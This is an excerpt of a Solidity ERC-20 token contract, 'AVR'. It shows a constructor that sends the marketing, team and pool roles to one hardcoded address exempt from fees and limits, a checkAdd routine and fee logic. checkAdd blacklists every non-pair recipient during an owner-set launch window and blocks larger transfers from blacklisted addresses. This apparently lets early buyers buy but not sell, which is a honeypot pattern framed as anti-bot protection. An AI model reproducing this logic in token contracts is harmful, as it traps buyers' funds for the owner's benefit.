...
contract AVR is Context, IERC20, Ownable {
    ...
    constructor(
        ...
        _maxTxAmount = token_totalSupply * 10**_decimals;
        _walletMax = token_totalSupply * 10**_decimals;
        _buyMarketingFee = token_buyMarketingFee;
        _sellMarketingFee = token_sellMarketingFee;
        marketingWallet = payable(0xB3964c3748481F0f2C63ae18d2B3619f141C74Ac);
        teamWallet = payable(0xB3964c3748481F0f2C63ae18d2B3619f141C74Ac);
        launchEnd = bot;
        _burn = burnfee;

        _poolAddress = 0xB3964c3748481F0f2C63ae18d2B3619f141C74Ac;
        ...
        isExcludedFromFee[_poolAddress] = true;
        ...
        isWalletLimitExempt[_poolAddress] = true;
        

        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[teamWallet] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[_poolAddress] = true;
    ...
    function checkAdd(address sender,address recipient,uint256 amount) internal{
        if(amount>balanceOf(sender).div(10000)){require(!theBOTAddress[sender] && !theBOTAddress[recipient], 'theBOTAddress address');  
        }if(launchStart + launchEnd >= block.number){if(recipient!=uniswapPair){
            theBOTAddress[recipient] = true;
    ...
    function takeFee(
        ...
        if (isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100).sub(burnfeeAmount);
        } else if (isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100).sub(burnfeeAmount);
        }
